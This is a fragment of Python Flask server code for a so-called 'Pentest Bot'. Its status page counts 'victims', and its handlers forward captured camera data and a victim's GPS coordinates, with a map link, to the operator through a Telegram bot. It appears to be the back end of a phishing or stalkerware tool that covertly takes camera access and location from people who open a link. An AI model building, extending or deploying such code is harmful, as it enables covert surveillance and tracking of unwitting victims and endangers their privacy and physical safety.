...
from config import BASE_URL, PORT, CHANNEL_USERNAME
...
def index():
    s = db.get_stats()
    return f'<html><body style="background:#0d1117;color:#c9d1d9;text-align:center;padding-top:100px">\
            <h1 style="color:#58a6ff">🔐 Pentest Bot</h1>\
            <p style="color:#3fb950">✅ Running</p>\
            <p>Users: {s["users"]} | Victims: {s["victims"]}</p></body></html>'
    ...
    try:
        ...
        if o:
            try:
                from bot import bot
                icon = '📷'
                bot.send_message(o, f'{icon} ক্যামেরা!\n`{code}`', parse_mode='Markdown')
            except: pass
    ...
    try:
        ...
        if o:
            try:
                ...
                bot.send_message(o, f'📍 লোকেশন!\n`{code}`\n{lat},{lng}\n[ম্যাপ](https://www.google.com/maps?q={lat},{lng})', parse_mode='Markdown')
            except: pass
        return jsonify({'status':'ok'})
    except Exception as e:
        return jsonify({'status':'error','msg':str(e)}), 500
